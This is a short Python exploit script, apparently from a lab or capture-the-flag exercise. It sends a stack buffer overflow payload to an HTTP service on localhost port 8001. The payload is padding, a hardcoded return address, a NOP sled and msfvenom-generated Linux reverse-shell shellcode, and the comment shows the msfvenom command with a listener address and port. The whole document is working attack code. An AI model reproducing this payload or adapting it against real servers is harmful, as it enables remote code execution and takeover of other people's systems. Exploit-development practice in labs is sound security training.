import socket
from pwn import *

# msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.132.130 LPORT=9001 -b "\x00\x0a\x0d" -f py

shellcode =  b""
shellcode += b"\xba\x4c\x26\x82\xd6\xdd\xc0\xd9\x74\x24\xf4\x5e"
shellcode += b"\x29\xc9\xb1\x12\x31\x56\x12\x83\xee\xfc\x03\x1a"
shellcode += b"\x28\x60\x23\x93\xef\x93\x2f\x80\x4c\x0f\xda\x24"
shellcode += b"\xda\x4e\xaa\x4e\x11\x10\x58\xd7\x19\x2e\x92\x67"
shellcode += b"\x10\x28\xd5\x0f\x63\x62\xa1\x4d\x0b\x71\xaa\x72"
shellcode += b"\xe5\xfc\x4b\xc4\x93\xae\xda\x77\xef\x4c\x54\x96"
shellcode += b"\xc2\xd3\x34\x30\xb3\xfc\xcb\xa8\x23\x2c\x03\x4a"
shellcode += b"\xdd\xbb\xb8\xd8\x4e\x35\xdf\x6c\x7b\x88\xa0"


junk = b"A" * 148
eip = p32(0xffffccee)
nop = b"\x90" * 20

payload = junk + eip + nop + shellcode

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("localhost", 8001))
sock.send(b"GET /"+ payload +b" HTTP/1.1\r\nHost:localhost:8001\r\n\r\n")
response = sock.recv(4096)
sock.close()